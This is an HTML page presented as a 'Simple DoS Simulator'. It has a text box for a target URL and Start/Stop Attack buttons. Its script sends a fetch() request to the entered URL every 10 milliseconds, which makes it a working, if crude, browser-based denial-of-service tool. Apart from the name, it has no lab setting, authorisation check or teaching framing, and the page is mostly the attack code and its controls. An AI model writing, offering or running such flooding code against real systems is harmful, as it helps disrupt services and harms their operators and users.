<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>DoS Simulator</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      color: #f1f1f1;
      margin: 0;
      padding: 0;
      background: url('./images/dos_bak.gif') no-repeat center center fixed;
      background-size: cover;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      backdrop-filter: blur(3px);
    }

    h1 {
      color: #00ffc3;
      background-color: rgba(0, 0, 0, 0.6);
      padding: 10px 20px;
      border-radius: 10px;
    }

    input[type="text"] {
      padding: 10px;
      width: 300px;
      border: none;
      border-radius: 5px;
      margin-bottom: 10px;
    }

    .buttons {
      display: flex;
      gap: 10px;
    }

    button {
      background-color: #00ffc3;
      color: #000;
      padding: 10px 20px;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      font-weight: bold;
    }

    button:hover {
      background-color: #00dba7;
    }

    #status {
      margin-top: 20px;
      font-size: 14px;
      background-color: rgba(0, 0, 0, 0.6);
      padding: 10px;
      border-radius: 5px;
    }
  </style>
</head>
<body>
  <h1>ðŸš€ Simple DoS Simulator</h1>
  <input type="text" id="targetUrl" placeholder="Enter target URL (e.g., http://192.168.1.100)" />
  <div class="buttons">
    <button onclick="startAttack()">Start Attack</button>
    <button onclick="stopAttack()">Stop Attack</button>
  </div>
  <div id="status"></div>

  <script>
    let attackInterval = null;

    function startAttack() {
      const url = document.getElementById("targetUrl").value;
      const status = document.getElementById("status");

      if (!url || !url.startsWith("http")) {
        status.innerText = "âŒ Please enter a valid URL.";
        return;
      }

      status.innerText = `ðŸ”¥ Starting DoS attack on ${url}...`;
      stopAttack();

      attackInterval = setInterval(() => {
        fetch(url).catch(err => console.log("Blocked or Failed:", err));
      }, 10);
    }

    function stopAttack() {
      const status = document.getElementById("status");
      if (attackInterval) {
        clearInterval(attackInterval);
        attackInterval = null;
        status.innerText = "ðŸ›‘ Attack stopped.";
      }
    }
  </script>
</body>
</html>
